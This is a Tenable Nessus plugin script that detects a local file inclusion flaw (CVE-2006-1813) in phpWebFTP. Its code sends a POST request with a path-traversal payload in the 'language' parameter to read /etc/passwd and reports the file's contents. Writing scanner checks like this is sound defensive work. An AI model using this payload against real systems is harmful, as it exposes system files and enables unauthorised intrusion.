#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21238);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2006-1813");
  script_bugtraq_id(17557);
  script_osvdb_id(24707);

  script_name(english:"phpWebFTP index.php language Parameter Local File Inclusion");
  script_summary(english:"Tries to read /etc/passwd using phpWebFTP");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
local file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running phpWebFTP, a web-based FTP client written
in PHP. 

The version of phpWebFTP installed on the remote host fails to
sanitize user-supplied input to the 'language' parameter of the
'index.php' script before using it in a PHP 'include()' function.  An
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user id. 

Note that successful exploitation of this issue requires that either
PHP's 'magic_quotes_gpc' setting be disabled or the attacker have the
ability to edit files on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/431115/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/04/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/04/16");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpwebftp:phpwebftp");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/webftp", "/ftp", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Grab index.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it looks like phpWebFTP...
  if ("phpWebFTP comes with ABSOLUTELY NO WARRANTY" >< res)
  {
    # Try to exploit one of the flaws to read a file.
    file = "../../../../../../../../../../../../etc/passwd%00";
    postdata = string(
      "server=1&",
      "port=21&",
      "goPassive=on&",
      "user=1&",
      "password=1&",
      "language=", file
    );
    r = http_send_recv3(method: "POST", item: dir+"/index.php", port: port,
      content_type: "application/x-www-form-urlencoded",
      exit_on_fail: 1, data: postdata);
    res = r[2];

    # There's a problem if there's an entry for root.
    #
    # nb: the application explicitly disables warnings so if the exploit fails
    #     we won't know if it was just because magic_quotes_gpc was enabled.
    if (egrep(pattern:"root:.*:0:[01]:", string:res))
    {
      contents = res - strstr(res, "</TD>");
      if (isnull(contents)) contents = res;

      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );

      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
